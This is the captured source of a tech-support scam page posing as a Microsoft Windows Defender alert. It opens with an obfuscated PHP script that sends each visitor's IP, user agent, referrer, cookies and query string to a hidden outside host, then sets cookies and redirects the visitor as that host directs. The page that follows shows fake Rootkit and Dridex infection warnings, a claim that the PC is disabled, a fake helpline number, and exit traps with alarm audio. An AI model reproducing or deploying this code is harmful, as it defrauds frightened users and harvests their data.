...
<?php date_default_timezone_set("UTC");error_reporting(0);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "482910";$uid="cvnsmxsz00ca7tndxzhv8orb4";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
        ...
        <title>**|\|PiRated*_FiRewall*_ActivaAtion_co0de*_detected_0x0blue0xxscrEen0786xy_cu5stomer_s5upport**_\||_**|</title>

        <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>d
...
<script type="text/javascript">
 $(document).ready(function() {
    ...
    audioElement.setAttribute('src', '0xhrk09xalrt0786x.mp3');
...
<script src="https://code.jquery.com/jquery-3.2.1.min.js" type="text/javascript"></script>
    ...
    <body id="mycanvas" onclick="showDiv()" onbeforeunload="return myFunction()" style="overflow: hidden;cursor:none;">
      ...
      <div style="position:absolute; top:40px; right:45px; z-index:99999;"><h3 style="font-size:22px; font-weight:bold; ">Call Microsoft Helpline +1-818-381-9844<script>document.write(phone_number2);</script></h3></div>
    ...
    margin-left: 6px;
    position: relative;
    top: 5px;">Microsoft</span> <p style="font-weight: 600;">Contact Helpline</p>
        ...
        <source src="0xhrk786xaltx09.mp3" type="audio/mpeg">
        </audio>
  ...
  <div class="row firewall-pro">
    ...
    margin-left: 10px;">
          <img src="microsoft.jpg"><span style="color: #000;">Windows_Firewall_Alert !</span>
          </div>
        </div>
        <div class="col-md-4">
          <div class="minimize">
    ...
    <h2 style="font-size:16px;font-weight:bold;">!!Dridex07!! Malware Detected</h2>
    <p>Access To This PC Has Been Disabled For Security Reasons.</p>
    <h2 style="font-size:21px; font-weight:bold;">Call Microsoft Helpline:+1-818-381-9844 <script>document.write(phone_number);</script></h2>
 ...
 <footer id="footer">
   <div class="row">
     <div class="col-md-6 left-code">
       <p>Threat_Detected - !!Rootkit!! Malware <br>
          App: keylogger.finance.exe</p>
     </div>
     <div class="col-md-6">
       <div class="button_new" id="footer_btn">
         <a href="#" class="safe" style="color: #FFFFFF !important;">Quick Support</a>
         <a href="#" class="anyway blink" style="color: #FFFFFF !important;"> Back To Safety</a>
       </div>
     </div>
   </div>
 </footer>
  <!-- End MailChimp Signup Form -->
    ...
    margin-top: 8px;">Windows_Defender_Security_Warning_Pirated_Code</p>
                     <p class="text-center">**ALL YOUR ONLINE ACCOUNTS ON THIS MACHINE MAY BE BANNED AND CANCELLED**</p>
                     <p>The Windows Key for this machine is pirated.Your computer has alerted us that it has been infected with !!Rootkit!! Malware. The following data has been compromised.</p>
                    ...
                    <p>Windows_Defender Scan found !!Rootkit!! Malware on this device that can steal your passwords, financial login details, personal files, pictures or documents.</p>
                    <p>You must contact Microsoft Helpline immediately so that our engineers can walk you through the removal process over the phone.</p>
                    <p>Call Microsoft Helpline immediately to report this threat, prevent identity theft and unlock access to this device.</p>
                    <p>Closing this window will put your personal information at risk and lead to termination of your Windows Licence Registration.</p>
                    <p style="padding-bottom: 0px; color:white; font-size:14px;" >Call Microsoft Helpline: <strong><script>document.write(phone_number);</script></strong></p>
                    <div class="action_buttons"> <a class="active" id="leave_page" style="cursor: pointer; color: #FFFFFF !important;">OK</a> <a class="active" id="leave_page" style="color: #FFFFFF !important;">Cancel</a> </div>
                 </div>
        ...
        <div class="bg">
            ...
            <p class="text-center" style="color: #FEFEFE;  margin-top:10px; background-color:#282828; font-size: 16px; opacity:.9; " >Do not restart or use your computer.<br>Your computer is disabled. Call Microsoft Helpline.<br>Access To This PC Has Been Disabled For Security Reasons.<br> Please contact us immediately.</p>
        ...
        <div class="win2" id="win2" style="display: none;cursor: none;">
            ...
            <div class="line_orange" style="background:#102a5c;">
                ...
                <div class="txt2" id="path1">C:WindowsSystem32host.exe</div>
        ...
        <div id="vir1">
            <div id="vir_tray">
                <div class="line_red" style="background:#102a5c;">
                    <span id="w4_1"><b>Threat_Detected!</b></span><br />
                    !!Rootkit!! Malware
                </div>
                <img src="5f205bc1a74d5_v.gif" class="ico_tray1" />
                <div class="txt1" id="w4_2">High_Risk</div>
        ...
        <div id="vir4">
            <div id="vir_tray">
                <div class="line_red" style="background:#102a5c;">
                    <span id="w4_1c"><b>Threat_Detected!</b></span><br />
                    !!Rootkit!! Malware - Keyboard Logger
                </div>
                <img src="5f205bc1a74d5_v.gif" class="ico_tray1" />
        ...
        <div id="vir5">
            <div id="vir_tray">
                <div class="line_red" style="background:#102a5c;">
                    <span id="w4_1d"><b>Threat_Detected!</b></span><br />
                    Malware.alert.368
                </div>
                <img src="5f205bc1a74d5_v.gif" class="ico_tray1" />
